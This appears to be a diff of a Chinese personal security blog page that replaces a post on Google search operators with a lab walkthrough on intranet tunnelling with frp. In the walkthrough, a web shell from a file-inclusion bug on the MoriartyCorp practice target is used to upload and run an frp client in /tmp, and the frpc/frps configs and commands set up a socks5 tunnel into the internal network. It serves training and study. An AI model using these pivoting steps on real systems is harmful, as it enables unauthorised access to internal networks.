@@ -3,9 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="referrer" content="no-referrer" />
-  <title>谷歌语法 | 个人博客</title>
-  <meta name="keywords" content=" 谷歌 , 信息搜集 ">
-  <meta name="description" content="谷歌语法 | 个人博客">
+  <title>内网穿透 | 个人博客</title>
+  <meta name="keywords" content=" SQL ">
+  <meta name="description" content="内网穿透 | 个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="1 什么是反向代理通过反向代理访问内网资源 2 方向代理工具-frpfrp 是一款高性能的反向代理应用，专注于内网穿透。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，您可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行中转。 3 frp-工作原理frp 主要由两个组件组成：客户端(frpc) 和 服务端(frps)。通常">
 <meta property="og:type" content="article">
@@ -599,9 +599,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-1 谷歌语法" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-反向代理（内网穿透）" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">谷歌语法</h1>
+        <h1 class="article-title">内网穿透</h1>
     
     <div class="article-meta">
         
@@ -611,7 +611,11 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="网安学习">网安学习</a>
+            <a  data-rel="内网">内网</a> > 
+            
+            <a  data-rel="内网&lt;---&gt;反向代理">反向代理</a> > 
+            
+            <a  data-rel="内网&lt;---&gt;反向代理&lt;---&gt;内网穿透">内网穿透</a>
             
         </span>
         
@@ -619,21 +623,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">谷歌</a>
-            
-            <a class="color5">信息搜集</a>
+            <a class="color4">SQL</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-07-23 20:45:53'>2024-07-23 20:34</time>
+            发布时间 : <time class="date" title='最后更新: 2024-08-14 20:02:35'>2024-08-14 20:34</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:893</span>
+        <span>字数:524</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -652,7 +654,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%AF%E4%BB%A5%E5%B0%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%BD%93%E4%BD%9C%E4%B8%80%E4%B8%AA%E6%95%B4%E4%BD%93"><span class="toc-text">1 双引号可以将搜索的字符串当作一个整体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%B7%E5%8F%AF%E4%BB%A5%E6%8C%87%E5%AE%9A%E7%BD%91%E7%AB%99%EF%BC%8C-%E5%8F%B7%E5%8F%AF%E4%BB%A5%E5%B1%8F%E8%94%BD%E6%8C%87%E5%AE%9A%E7%BD%91%E7%AB%99"><span class="toc-text">2 +号可以指定网站，-号可以屏蔽指定网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-filetype-%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-text">3 filetype: 可以搜索指定文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-inurl-%E5%B0%86%E8%8C%83%E5%9B%B4%E9%99%90%E5%88%B6%E5%9C%A8url%E4%B8%AD"><span class="toc-text">4 inurl: 将范围限制在url中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-site-%E7%89%B9%E5%AE%9A%E5%9F%9F%E5%90%8D%E5%90%8E%E7%BC%80"><span class="toc-text">5 site: 特定域名后缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%83%B3%E8%A6%81%E6%8E%92%E9%99%A4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-X"><span class="toc-text">6 想要排除，可以通过 -X</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-text">1 什么是反向代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%B9%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7-frp"><span class="toc-text">2 方向代理工具-frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-frp-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">3 frp-工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%9D%B6%E5%9C%BA-MoriartyCorp"><span class="toc-text">4 靶场-MoriartyCorp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E9%A6%96%E5%85%88%E6%8B%BF%E5%88%B0%E7%BD%91%E7%AB%99%E7%9A%84shell%EF%BC%8C%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.1 首先拿到网站的shell，通过文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E9%A6%96%E5%85%88%E9%85%8D%E7%BD%AEfrp%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">4.2 首先配置frp的客户端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">4.3 服务器端文件配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E5%B0%86%E9%85%8D%E7%BD%AE%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8Cfrp%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%9A%E8%BF%87%E8%9A%81%E5%89%91%E7%9B%B4%E6%8E%A5%E4%BC%A0%E5%85%A5tmp%E7%9B%AE%E5%BD%95"><span class="toc-text">4.4 将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%BF%90%E8%A1%8C"><span class="toc-text">4.5 服务器端运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-%E4%B8%BA%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B7%BB%E5%8A%A0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90-%E5%B9%B6%E8%BF%90%E8%A1%8C"><span class="toc-text">4.6 为客户端添加可执行权限,并运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-%E5%BD%93%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%88%90%E5%8A%9F%E5%90%8E-%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%82%E4%BB%A3%E7%90%86-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91"><span class="toc-text">4.7 当反向代理成功后 ，浏览器挂代理,访问内网</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -668,99 +670,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <table>
-<thead>
-<tr>
-<th><strong>算  符</strong></th>
-<th><strong>含    义</strong></th>
-<th><strong>应用举例</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>AND&#x2F;空格</td>
-<td>所连接的关键词之间是“与”的关系;</td>
-<td>云计算 分布式计算</td>
-</tr>
-<tr>
-<td>OR&#x2F;&#124;</td>
-<td>所连接的关键词之间是“或”的关系</td>
-<td>图片 &#124; 写真</td>
-</tr>
-<tr>
-<td>-</td>
-<td>所连接的关键词之间是“非”的关系</td>
-<td>神雕侠侣 -游戏</td>
-</tr>
-<tr>
-<td>（）</td>
-<td>在检索式中括号里的运算将优先进行</td>
-<td>电子商务 AND  (云计算 -分布式计算)</td>
-</tr>
-<tr>
-<td>“”</td>
-<td>“”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索</td>
-<td>“智能天线”</td>
-</tr>
-<tr>
-<td>*</td>
-<td>通配符-星号*，代表完整的字词; A * B、A * * B这两个是有区别的</td>
-<td>Flower  * pots &#x2F;Flower * * pots</td>
-</tr>
-<tr>
-<td>+</td>
-<td>强制搜索一般会被自动忽略的搜索关键词，如：who、the、of、am</td>
-<td>+B</td>
-</tr>
-<tr>
-<td>~</td>
-<td>同义符;在搜索词前使用，表示会和同时搜索相近词义的词;示例中会同搜元素Si</td>
-<td>~  silicon</td>
-</tr>
-<tr>
-<td>..</td>
-<td>搜索数字范围限定</td>
-<td>手机价格2000..5000</td>
-</tr>
-<tr>
-<td>filetype:</td>
-<td>把搜索范围限定在特定文件类型中; .pdf&#x2F;.doc&#x2F;.docx&#x2F;.ppt&#x2F;.pptx&#x2F;.xls&#x2F;.xlsx&#x2F;.rtf&#x2F;.txt&#x2F;.swf&#x2F;.ps</td>
-<td>霍金 黑洞filetype:pdf</td>
-</tr>
-<tr>
-<td>site：</td>
-<td>把搜索范围限定在特定站点、某一站点特定频道、特定域名后缀中</td>
-<td>科技 site:news.163.com</td>
-</tr>
-<tr>
-<td>inurl:</td>
-<td>把搜索范围限定在url链接中</td>
-<td>inurl:jiqiao  photoshop</td>
-</tr>
-<tr>
-<td>allinurl:</td>
-<td>把搜索范围限定在url链接中, 只不过其后所有关键词均要在url链接中出现</td>
-<td>allinurl:jiqiao  photoshop</td>
-</tr>
-<tr>
-<td>intitle</td>
-<td>把搜索范围限定在网页标题中</td>
-<td>商业 intitle:超级女声</td>
-</tr>
-<tr>
-<td>allintitle:</td>
-<td>把搜索范围限定在网页标题中; 只不过其后所有关键词均要在网页标题中出现</td>
-<td>allintitle:超级女声 张靓颖</td>
-</tr>
-<tr>
-<td>intext:</td>
-<td>把搜索范围限定在网页正文中; 忽略超链接文本、URL以及题目等</td>
-<td></td>
-</tr>
-</tbody></table>
-<p> |<br>| inanchor: | 把搜索范围限定在链接锚文本文字中 | inanchor:吴清源 |<br>| anchor: | 检索某一作者&#x2F;发明人的论著; 只在Google Scholar中可用 | anchor:&#x2F;作者: |<br>| link： | 检索所有链接到某个特定URL网址的网页;只能单独使用 | link:163.com |<br>| cache: | Google网页快照 | </p>
-<p> |<br>| related： | 检索与某特定网页类似的网页 | related:<a target="_blank" rel="noopener" href="http://www.163.com/index.shtml">www.163.com/index.shtml</a> |<br>| info: | 用来显示与某链接相关的一系列搜索; 提供cache、similar-pages、link、related等连接 | info:<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">www.sina.com.cn</a> |<br>| Index  of | 可以帮助你寻找网络和FTP目录 | index  of mp3 |<br>| daterange: | 查找在一定的日期或者一定的日期范围内; 只关注被Google收录的时间 | </p>
-<p> |<br>| location: | 指定地区区域内查询关键词相关的网页 | wow  gold location:France |<br>| weather: | 查询该地区或城市当前的天气状况 | weather:北京 |<br>| stocks: | 查询股票信息; 一般源于专业财经网站 | stocks:比亚迪 |<br>| define: | 返回包含查询关键词定义的网面 | define:  暗网 |<br>| 注意:关键词与命令之间有一个空格;在这些关键字中;请勿在冒号后面接空格;命令需用英文输入,包括冒号。AND、OR、NOT均应大写,而其他算符必须是小写，虽其对检索词完全不区分大小写 |  |  |</p>
-<h3 id="1-双引号可以将搜索的字符串当作一个整体"><a href="#1-双引号可以将搜索的字符串当作一个整体" class="headerlink" title="1 双引号可以将搜索的字符串当作一个整体"></a>1 双引号可以将搜索的字符串当作一个整体</h3><h3 id="2-号可以指定网站，-号可以屏蔽指定网站"><a href="#2-号可以指定网站，-号可以屏蔽指定网站" class="headerlink" title="2 +号可以指定网站，-号可以屏蔽指定网站"></a>2 +号可以指定网站，-号可以屏蔽指定网站</h3><h3 id="3-filetype-可以搜索指定文件"><a href="#3-filetype-可以搜索指定文件" class="headerlink" title="3 filetype: 可以搜索指定文件"></a>3 filetype: 可以搜索指定文件</h3><h3 id="4-inurl-将范围限制在url中"><a href="#4-inurl-将范围限制在url中" class="headerlink" title="4 inurl: 将范围限制在url中"></a>4 inurl: 将范围限制在url中</h3><h3 id="5-site-特定域名后缀"><a href="#5-site-特定域名后缀" class="headerlink" title="5 site: 特定域名后缀"></a>5 site: 特定域名后缀</h3><h3 id="6-想要排除，可以通过-X"><a href="#6-想要排除，可以通过-X" class="headerlink" title="6 想要排除，可以通过 -X"></a>6 想要排除，可以通过 -X</h3><p>谷歌高级搜索<br><a target="_blank" rel="noopener" href="http://www.google.com.hk/advanced_search">http://www.google.com.hk/advanced_search</a><br>Google网页搜索帮助中心<br><a target="_blank" rel="noopener" href="https://support.google.com/websearch/?hl=zh-Hans">https://support.google.com/websearch/?hl=zh-Hans</a><br>谷歌分类目录<br><a target="_blank" rel="noopener" href="http://directory.google.com/">http://directory.google.com/</a></p>
+        <h3 id="1-什么是反向代理"><a href="#1-什么是反向代理" class="headerlink" title="1 什么是反向代理"></a>1 什么是反向代理</h3><p>通过反向代理访问内网资源</p>
+<h3 id="2-方向代理工具-frp"><a href="#2-方向代理工具-frp" class="headerlink" title="2 方向代理工具-frp"></a>2 方向代理工具-frp</h3><p>frp 是一款高性能的<code>反向代理</code>应用，专注于<code>内网穿透</code>。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，您可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行<code>中转</code>。</p>
+<h3 id="3-frp-工作原理"><a href="#3-frp-工作原理" class="headerlink" title="3 frp-工作原理"></a>3 frp-工作原理</h3><p>frp 主要由两个组件组成：客户端(frpc) 和 服务端(frps)。通常情况下，服务端部署在具有公网 IP 地址的机器上，而客户端部署在需要穿透的内网服务所在的机器上。<br>由于内网服务缺乏公网 IP 地址，因此无法直接被非局域网内的用户访问。用户通过访问服务端的 frps，frp 负责根据请求的端口或其他信息将请求路由到相应的内网机器，从而实现通信。</p>
+<h3 id="4-靶场-MoriartyCorp"><a href="#4-靶场-MoriartyCorp" class="headerlink" title="4 靶场-MoriartyCorp"></a>4 靶场-MoriartyCorp</h3><h4 id="4-1-首先拿到网站的shell，通过文件包含漏洞"><a href="#4-1-首先拿到网站的shell，通过文件包含漏洞" class="headerlink" title="4.1 首先拿到网站的shell，通过文件包含漏洞"></a>4.1 首先拿到网站的shell，通过文件包含漏洞</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723633607198-ccf1d460-d82a-4b0a-b5ba-c8e7b0a91938.png#averageHue=%23363635&clientId=ued4f7d65-a452-4&from=paste&height=241&id=u2f5495cf&originHeight=331&originWidth=1261&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=27585&status=done&style=none&taskId=u73a9f03e-5c4d-4b3f-87f1-2298ada027d&title=&width=917.0909090909091" alt="image.png"></p>
+<h4 id="4-2-首先配置frp的客户端"><a href="#4-2-首先配置frp的客户端" class="headerlink" title="4.2 首先配置frp的客户端"></a>4.2 首先配置frp的客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">192.168</span><span class="number">.56</span><span class="number">.3</span>			<span class="comment">//服务器端的地址</span></span><br><span class="line">server_port = <span class="number">21080</span>					<span class="comment">//s与c的通信端口，这个可以自行设置</span></span><br><span class="line">token = 1qaz<span class="meta">@QWE</span>					<span class="comment">//token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</span></span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp							<span class="comment">//指定连接协议</span></span><br><span class="line">remote_port = <span class="number">123</span>					<span class="comment">//指定文件传输端口</span></span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+<h4 id="4-3-服务器端文件配置"><a href="#4-3-服务器端文件配置" class="headerlink" title="4.3 服务器端文件配置"></a>4.3 服务器端文件配置</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">21080</span>					<span class="comment">//连接端口</span></span><br><span class="line">bind_addr = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>					<span class="comment">//监听0.0.0.0所有的都可以连接</span></span><br><span class="line">token = 1qaz<span class="meta">@QWE</span></span><br></pre></td></tr></table></figure>
+<h4 id="4-4-将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录"><a href="#4-4-将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录" class="headerlink" title="4.4 将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录"></a>4.4 将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录</h4><h4 id="4-5-服务器端运行"><a href="#4-5-服务器端运行" class="headerlink" title="4.5 服务器端运行"></a>4.5 服务器端运行</h4><ul>
+<li>找到当前路径，打开cmd，并执行<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c </span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-6-为客户端添加可执行权限-并运行"><a href="#4-6-为客户端添加可执行权限-并运行" class="headerlink" title="4.6 为客户端添加可执行权限,并运行"></a>4.6 为客户端添加可执行权限,并运行</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/frpc*				<span class="comment">//可执行权限</span></span><br><span class="line">/tmp/frpc -c /tmp/frpc.tonl 	<span class="comment">//后面指定配置文件</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1723633012979-048af324-a695-42b3-8b44-bd29a5bec9e9.png?x-oss-process=image/format,webp#averageHue=%23040404&from=url&id=Cfzcg&originHeight=265&originWidth=581&originalType=binary&ratio=1.375&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h4 id="4-7-当反向代理成功后-，浏览器挂代理-访问内网"><a href="#4-7-当反向代理成功后-，浏览器挂代理-访问内网" class="headerlink" title="4.7 当反向代理成功后 ，浏览器挂代理,访问内网"></a>4.7 当反向代理成功后 ，浏览器挂代理,访问内网</h4><ul>
+<li>端口为信息传输端口</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723636039152-81cbe099-70fc-4005-8688-a0bf63a7fe29.png#averageHue=%23fbfbfb&clientId=u3a4e4ba6-ef7b-4&from=paste&height=551&id=u185aa7b7&originHeight=757&originWidth=1331&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=47904&status=done&style=none&taskId=u25b94401-a098-4975-8a27-9bdd3cc79a1&title=&width=968" alt="image.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
